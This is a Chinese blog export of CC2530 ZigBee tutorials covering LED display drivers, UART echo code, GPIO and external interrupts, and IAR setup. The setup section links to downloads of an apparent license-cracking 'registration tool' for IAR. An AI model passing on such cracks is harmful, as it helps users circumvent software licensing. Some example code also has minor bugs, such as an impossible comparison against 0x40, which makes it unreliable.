<p>另外附上74LS164_8LED 数码管显示的代码，把代码添加到工程里即可</p>
<p>74LS164_8LED.h</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__74LS164_8LED_H__</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__74LS164_8LED_H__</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>  <span class="token macro-name">LS164_DATA</span>  <span class="token expression">P1_3</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>  <span class="token macro-name">LS164_CLK</span>   <span class="token expression">P1_2</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>  <span class="token macro-name">UCHAR</span>  <span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> </span></span>
<span class="token keyword">void</span> <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>UCHAR Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//P1.3  DATA   P1.2  CLK</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span></code></pre>

<p>74LS164_8LED.c</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span>
<span class="token keyword">static</span> UCHAR LED_Map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x5b</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span>
                        <span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span>
                        <span class="token number">0x7f</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    P1SEL <span class="token operator">&amp;=</span><span class="token operator">~</span><span class="token number">0x0C</span><span class="token punctuation">;</span><span class="token comment">//xxxx 00xx  配置为普通IO模式</span>
    P1DIR <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span><span class="token comment">//xxxx 11xx   配置为输出模式</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>UCHAR Index<span class="token punctuation">)</span> <span class="token comment">//P1.3  DATA   P1.2  CLK</span>
<span class="token punctuation">&#123;</span>  
    UCHAR i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    UCHAR Data<span class="token operator">=</span>LED_Map<span class="token punctuation">[</span>Index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&amp;</span> Data<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            LS164_DATA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>            
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
            LS164_DATA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span>
        Data<span class="token operator">=</span>Data <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>
        LS164_CLK<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        LS164_CLK<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="USB转串口配置"><a href="#USB转串口配置" class="headerlink" title="USB转串口配置"></a>USB转串口配置</h1><p>CC2530具备两个串口，且每个串口都可以配置选择控制脚</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-0.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-91.png" alt loading="lazy"></p>
<p><strong>步骤：</strong></p>
<p>1、指定串口的IO位置</p>
<pre class="language-c" data-language="c"><code class="language-c">PERCFG <span class="token operator">&amp;=</span><span class="token number">0xFE</span><span class="token punctuation">;</span><span class="token comment">//1111 1110 选中串口0的的备用位置1</span></code></pre>

<p>2、相应IO配置成偏上外设功能</p>
<pre class="language-c" data-language="c"><code class="language-c">P0SEL <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span>       <span class="token comment">//0000 1100 P0_2 p0_3为偏上外设功能</span></code></pre>

<p>3、8个数据位，1个停止位，无流控，无校验确立</p>
<pre class="language-c" data-language="c"><code class="language-c">U0CSR <span class="token operator">|=</span><span class="token number">0Xc0</span><span class="token punctuation">;</span></code></pre>

<p>4、波特率设置</p>
<pre class="language-c" data-language="c"><code class="language-c">U0GCR <span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
U0BAUD<span class="token operator">=</span><span class="token number">59</span><span class="token punctuation">;</span></code></pre>

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/时钟，串口配置/image-95.png" style="zoom: 80%;" loading="lazy">

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-92-e1579148396866.png" alt loading="lazy"></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/时钟，串口配置/image-94.png" style="zoom:67%;" loading="lazy">

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-93.png" alt loading="lazy"></p>
<p>5、开CPU中断，对应串口接收中断</p>
<pre class="language-c" data-language="c"><code class="language-c">EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
URX0IE<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//结尾为0或8则可以直接选择赋值</span></code></pre>

<p>USART0接收字符利用中断服务函数</p>
<ul>
<li><p>当一个字节由串口接收到C2530，字节会保存到U0DBUF寄存器，同时接收中断标志URX0IF位会置1</p>
</li>
<li><p>可以利用中断服务程序来接收该字符串</p>
</li>
<li><p>中断服务函数</p>
<p>#pragma vector = URX0_VECTOR<br>__interrupt void UART0_ISR(void)</p>
</li>
</ul>
<h1 id="总测试代码"><a href="#总测试代码" class="headerlink" title="总测试代码"></a><strong>总测试代码</strong></h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span>
<span class="token keyword">char</span> ch<span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">Cfg32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span> <span class="token comment">//fB 0 00 让2个时钟源都起振</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//  0100 0000  如果32M 晶振供电且稳定了，那么程序往下运行</span>
    CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span> <span class="token comment">//1111 1000 不分频输出</span>

    CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 让32M作为系统主时钟供给CPU</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">==</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果32M确实供给CPU在工作，那么程序往下执行</span>
    SLEEPCMD <span class="token operator">|=</span><span class="token number">0x40</span><span class="token punctuation">;</span><span class="token comment">// 0000 0100 </span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">UartCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token comment">//串口0的备用位置1配置成波特率9600</span>
   PERCFG <span class="token operator">&amp;=</span><span class="token number">0xFE</span><span class="token punctuation">;</span><span class="token comment">//1111 1110 选中串口0的的备用位置1</span>
   P0SEL  <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span>       <span class="token comment">//0000 1100 P0_2 p0_3为偏上外设功能</span>
   
   U0CSR <span class="token operator">|=</span><span class="token number">0Xc0</span><span class="token punctuation">;</span>
   
   U0GCR <span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
   U0BAUD<span class="token operator">=</span><span class="token number">59</span><span class="token punctuation">;</span>
   EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
   URX0IE<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">Cfg32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">UartCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>URX0_VECTOR</span><span class="token comment">//中断服务函数</span></span>
__interrupt <span class="token keyword">void</span> <span class="token function">UART0_ISR</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    
    URX0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//串口0来数据的标志位，硬件会置1，我们软件要清0</span>
    ch<span class="token operator">=</span>U0DBUF<span class="token punctuation">;</span><span class="token comment">//从接受寄存器里取字节存入变量ch</span>
    
    U0DBUF<span class="token operator">=</span>ch<span class="token punctuation">;</span><span class="token comment">//把变量ch里的值赋给串口0发送数据寄存器</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>UTX0IF<span class="token punctuation">)</span><span class="token punctuation">;</span>
    UTX0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>ZigBee</category>
      </categories>
      <tags>
        <tag>ZigBee</tag>
      </tags>
  </entry>
  <entry>
    <title>IO控制与外部中断</title>
    <url>/posts/4344df18/</url>
    <content><![CDATA[<p>CC2530只具备<a href="https://baike.baidu.com/item/QFN%E5%B0%81%E8%A3%85/5168878?fr=aladdin">QFN</a>40封装 工作范围：2~3.6V(推荐选3.3V)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-67.png" alt loading="lazy"></p>
<p>一共有21个通用IO口，其中这21个分为3组P0\P1\P2； 其中P0\P1组各8个IO，P2组5个（P2_0、P2_1、 P2_2、P2_3、 P2_4）。</p>
<p>这些口子都可以作为普通或对应的片上外设控制。</p>
<p>其中P1_0 P1_1有20mA的输出驱动能力，其余的只有4mA</p>
<p>PxSEL、PxDIR、PxINP Px（x分别对应0、1、2,用来控制对应的IO口组）3种寄存器；复位、默认都是0</p>
<span id="more"></span>

<h1 id="PxSEL寄存器"><a href="#PxSEL寄存器" class="headerlink" title="PxSEL寄存器"></a>PxSEL寄存器</h1><p>PxSEL寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是普通IO口还是片上外设，0表示普通IO口，1表示片上外设。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-68.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-69.png" alt loading="lazy"></p>
<h1 id="PxDIR寄存器"><a href="#PxDIR寄存器" class="headerlink" title="PxDIR寄存器"></a>PxDIR寄存器</h1><p>PxDIR寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是输入还是输出，0表示输入，1表示输出。</p>
<p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 后面的位不用管。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-70.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-71.png" alt loading="lazy"></p>
<h1 id="PxINP寄存器"><a href="#PxINP寄存器" class="headerlink" title="PxINP寄存器"></a>PxINP寄存器</h1><p>PxINP寄存器作用: 在输入的时候，8位，每一位对应具体的IO组中的相应的一个IO，决定它是上下拉模式还是三态，0表示上下拉模式，1表示三态。</p>
<p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 ，后面的3位决定在配置为上下拉模式的时候，组为上拉 还是下拉，0表示上拉，1表示下拉。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-72.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-73.png" alt loading="lazy"></p>
<h1 id="EA"><a href="#EA" class="headerlink" title="EA"></a>EA</h1><p>总CPU开关中断，令其为1则为开关闭合</p>
<h1 id="PxIE"><a href="#PxIE" class="headerlink" title="PxIE"></a>PxIE</h1><p>组使能位，控制PxIEN</p>
<p>注意：可以直接令P0IE=1，若要设置P1IE为1，则令IEN2 |=0x10；相当于P1IE=1</p>
<h1 id="PxIEN"><a href="#PxIEN" class="headerlink" title="PxIEN"></a>PxIEN</h1><p>对应的中断使能标志位，使用方法：PxIEN |= 0x__；为1则为闭合</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-74.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-75.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-76.png" alt loading="lazy"></p>
<h1 id="PICTL寄存器"><a href="#PICTL寄存器" class="headerlink" title="PICTL寄存器"></a>PICTL寄存器</h1><p>0代表上升沿，1代表下降沿。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-77.png" alt loading="lazy"></p>
<h1 id="PxIFG"><a href="#PxIFG" class="headerlink" title="PxIFG"></a>PxIFG</h1><p>中断状态标志寄存器, 当发生中断时，相应位将被置1</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-79.png" alt loading="lazy"></p>
<h1 id="中断函数"><a href="#中断函数" class="headerlink" title="中断函数"></a>中断函数</h1><p>pragma vector=PxINT_VECTOR（x=0,1,2）</p>
<pre class="language-c" data-language="c"><code class="language-c">pragma vector<span class="token operator">=</span>PxINT_VECTOR（x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>）
__interrupt  <span class="token keyword">void</span>  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
PxIFG<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> PxIF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>函数最后需要将PxIFG和PxIF清零。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-78.png" alt loading="lazy"></p>
<p>最后附上一段能够按按钮控制灯亮灭的代码</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span>
<span class="token keyword">void</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>
   <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
     <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">30</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span> 
  P0SEL <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0_5设置为普通IO口</span>
  P0DIR <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0_5设置为输入</span>
  P0INP <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0_5设置为上下拉模式</span>
  P2INP <span class="token operator">&amp;=</span><span class="token number">0xDF</span><span class="token punctuation">;</span><span class="token comment">// 1101 1111 //P0组配置成上拉模式</span>
  
  EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//闭合总CPU</span>
  P0IE<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//P1IE如果要设置为1，那么我们不能直接用P1IE=1,IEN2 |=0x10;// 0001 0000</span>
  <span class="token comment">//IEN2 |=0x10;//相当于P1IE=1</span>
  P0IEN <span class="token operator">|=</span><span class="token number">0X20</span><span class="token punctuation">;</span><span class="token comment">// 0010 0000 设置3个中断使能标志位，让相应的中断开关合上</span>
  
  PICTL <span class="token operator">|=</span><span class="token number">0x01</span><span class="token punctuation">;</span><span class="token comment">//把P0这一组配置成下降沿触发//PICTL |=0x02则为把P1组配置成下降沿</span>
  
  P1DIR <span class="token operator">|=</span><span class="token number">0X01</span><span class="token punctuation">;</span><span class="token comment">//配置P1_0位输出</span>
  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//死循环，不结束函数</span>
<span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">optimize<span class="token operator">=</span>none</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>P0INT_VECTOR</span></span>
__interrupt <span class="token keyword">void</span> <span class="token function">fsdfas</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>P0IFG <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">// 0010 0000</span>
    <span class="token punctuation">&#123;</span><span class="token comment">//P0组的第5位 P0_5引发了外部中断</span>
        <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>P0_5<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span><span class="token comment">//说明确实是连接在P0_5的按钮触发了外部中断</span>
           P1_0 <span class="token operator">^=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//异或操作</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    P0IFG<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> 
    P0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>]]></content>
      <categories>
        <category>ZigBee</category>
      </categories>
      <tags>
        <tag>ZigBee</tag>
      </tags>
  </entry>
  <entry>
    <title>ZigBee入门</title>
    <url>/posts/1dea566/</url>
    <content><![CDATA[<ul>
<li>学习ZigBee不仅仅是学习控制器本身，还要掌握一堆叫做协议栈的代码和网络的一些相关东西</li>
</ul>
<p>ZigBee是无线设备之间的一种通信方式，类似于任人和人之间的普通话交流，普通话就是一种通信方式</p>
<p>ZigBee，ZigBee通信方式，ZigBee协议这三者没任何区别，只是说法不同而已</p>
<p>ZigBee的作用就是用于无线模块和模块之间的通信，构建无线局域网</p>
<p>无线传感网络：如果这个无线局域网用于传感器的数据收集和监控，那么这个网络就叫做无线传感器网络，是无线局域网的一种具体应用</p>
<p>引入ZigBee通信方式的原因：</p>
<ul>
<li>WiFi：通信速率大，功耗大等</li>
<li>蓝牙：功耗小，组网的节点数较少</li>
<li>ZigBee：可以组件大规模的网络，功耗低（TI CC2530 正常工作电流8mA，最低工作达到几个uA），缺点为通信速率小，MAX=250KB</li>
</ul>
<p>此次使用的是CC2530芯片</p>
<span id="more"></span>

<h1 id="环境的安装和搭建"><a href="#环境的安装和搭建" class="headerlink" title="环境的安装和搭建"></a>环境的安装和搭建</h1><p>工作环境IAR的安装：</p>
<p><a href="https://pan.baidu.com/s/1YvVTsz7ZBu1c3FSTDQVjVA">下载链接</a>，提取码：vbzy</p>
<p>使用注册工具激活：</p>
<p><a href="https://pan.baidu.com/s/1iCz3AGJwQPoXLJ5Uf5rHwQ">下载链接</a>，提取码：2c5p</p>
<p>注意：Win7以上的系统激活的时候需要右键以管理员方式运行软件，否则会在后面的编译代码的过程中出现错误，<a href="https://zhidao.baidu.com/question/447439875.html">详见链接</a></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/u83GDwMvLFlJB2W.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/aJf8yK4ZkPORcSX.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/IrqQgWvn1JaZCz7.png" loading="lazy">

<p>如图所示激活操作，其余操作只需next即可</p>
<h1 id="新建工程文件"><a href="#新建工程文件" class="headerlink" title="新建工程文件"></a>新建工程文件</h1><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/YM1nrkzWNiZh3KL.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/hKd4nOpzQ8c6DqH.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/M7zojwX6V3TRxg9.png" loading="lazy">

<p>C语言.c文件建立与保存</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/2yUOpqJR5MWLecm.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/P5ECVbMHxGUvI69.png" loading="lazy">

<p>将文件添加到工程中：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/Er96gzcCAYIORKk.png" loading="lazy">

<p>写入代码：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iocc2530.h></span></span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  P1DIR <span class="token operator">|=</span><span class="token number">0X01</span><span class="token punctuation">;</span><span class="token comment">//让P_0为输出</span>
  P1_0<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//0为低电平，使二极管发光，1为高电平</span>
  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/htJEQRjI3Dfepy4.png" loading="lazy">

<p>点击编译：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/RmyKXTsE79GHuOl.png" loading="lazy">

<p>在弹出的框框中给工程工作空间命名：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/j3tPOgkvs1MpoEr.png" loading="lazy">

<p>保存，编译通过</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/b8COxYTdSlU5sIV.png" loading="lazy">

<p>以下为工程目录中各文件的介绍：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/JzwFsD25EGR9S4C.png" loading="lazy">

<h1 id="ZigBee仿真器"><a href="#ZigBee仿真器" class="headerlink" title="ZigBee仿真器"></a>ZigBee仿真器</h1><p>仿真与下载程序用到的一种硬件</p>
<p>需啊在Windows环境下安装驱动才可以使用</p>
<p><a href="https://pan.baidu.com/s/1cM9o3uMKPdgISDyFvodyMg">驱动下载链接</a>，提取码：3gbw</p>
<p>在电脑USB端口插上仿真器，打开设备管理器，右键新加进来的前面有黄色感叹号的标致，点击更新驱动</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/uCKOXfbs7zI5GaM.png" loading="lazy">

<p>点击浏览定位到驱动文件夹，随后下一步安装即可</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/WafLPxBkTDVo4vM.png" loading="lazy">

<p>随后进行下载操作（即将程序下载到板子里）</p>
<h1 id="下载前的配置操作"><a href="#下载前的配置操作" class="headerlink" title="下载前的配置操作"></a>下载前的配置操作</h1><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/ANBYtOsRPDoSCHQ.png" loading="lazy">

<p>器件选择：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/yMp4BiOlKfHmPq3.png" loading="lazy">

<p>点击后弹出一个文件夹，此文件夹在IAR软件的安装目录下</p>
<p>选择–&gt;Texas Instruments–&gt;CC2530F256，打开即可</p>
